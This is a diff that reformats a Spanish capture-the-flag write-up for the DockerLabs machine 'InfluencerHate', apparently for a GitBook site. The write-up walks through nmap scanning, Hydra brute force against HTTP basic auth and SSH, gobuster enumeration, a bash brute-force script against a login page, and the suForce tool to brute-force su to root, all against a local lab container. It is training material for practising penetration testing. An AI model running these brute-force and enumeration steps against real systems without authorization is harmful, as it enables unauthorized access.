@@ -1,22 +1,30 @@
-# 🖥️ Writeup - InfluencerHate 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# InfluencerHate ​​
+
+## 🖥️ Writeup - InfluencerHate
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Hydra` `Burp Suite` `Gobuster` `Base64` `Brute Force` `Basic Auth` `Bash Scripting` `Cracking`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip influencerhate.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh influencerhate.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 18:26 CEST
 Nmap scan report for 172.17.0.2
@@ -87,13 +96,14 @@ Vamos a intentar aplicar fuerza bruta al panel de `login`, teniendo en cuenta qu
 
 Disponemos de un diccionario por defecto con este formato llamado `ftp-betterdefaultpasslist.txt`. Si no encontramos credenciales válidas, también podemos adaptar cualquier otro diccionario para darle este formato.
 
-# HYDRA
+## HYDRA
 
 ```bash
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -105,17 +115,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 18:40:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 18:40:23
 ```
+
 Tras la prueba, obtenemos las credenciales: `httpadmin` : `fhttpadmin`.
 
 Una vez dentro nos encontramos con la página por defecto de `Apache2`.
 
-# GOBUSTER
+## GOBUSTER
 
-Procedemos a buscar directorios o archivos ocultos en la web con  `Gobuster`, pero para ello es necesario proporcionar también el `header` con el `usuario` y la `contraseña` de autenticación.
+Procedemos a buscar directorios o archivos ocultos en la web con `Gobuster`, pero para ello es necesario proporcionar también el `header` con el `usuario` y la `contraseña` de autenticación.
 
 Para obtener dicho header interceptamos la petición con `BurpSuite`.
 
 Info:
+
 ```
 GET / HTTP/1.1
 Host: 172.17.0.2
@@ -142,6 +154,7 @@ echo "aHR0cGFkbWluOmZodHRwYWRtaW4=" | base64 -d
 ```
 
 Info:
+
 ```
 httpadmin:fhttpadmin
 ```
@@ -153,6 +166,7 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -174,10 +188,11 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 275]
 ```
 
-# FUERZA BRUTA
+## FUERZA BRUTA
+
 Existe un `login.php`, así que volvemos a intentar un ataque de fuerza bruta.
 
-![alt text](../../images/login.png)
+![alt text](../../.gitbook/assets/login.png)
 
 Para ello creamos un `script` en `bash` llamado `fuerza_bruta.sh`.
 
@@ -211,6 +226,7 @@ chmod +x fuerza_bruta.sh
 ```
 
 Info:
+
 ```
 Probando: 123456
 Probando: 12345
@@ -244,7 +260,6 @@ Probando: chocolate
 
 De esta manera encontramos las credenciales de acceso al login: `admin` : `chocolate`.
 
-
 Una vez introducidas las credenciales aparece un mensaje que nos hace pensar que existe un usuario del sistema llamado `balutin`.
 
 ```
@@ -258,6 +273,7 @@ hydra -l balutin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -277,7 +293,7 @@ Encontramos las credenciales para el usuario `balutin` : `estrella`.
 
 Accedemos por `SSH`.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
@@ -286,7 +302,6 @@ No encontramos nada relevante.
 Seguimos buscando sin éxito, así que probamos otro ataque de fuerza bruta, esta vez al usuario `root` desde la sesión de `balutin`.
 
 Descargamos el script `suForce` de `GitHub` en nuestra máquina atacante.
-
 
 ```bash
 wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
@@ -307,6 +322,7 @@ chmod +x suForce
 ```
 
 Info:
+
 ```
             _____                          
  ___ _   _ |  ___|__  _ __ ___ ___   
@@ -330,6 +346,7 @@ su root
 ```
 
 Info:
+
 ```
 root@4fd4c5ded6c2:/tmp# whoami
 root
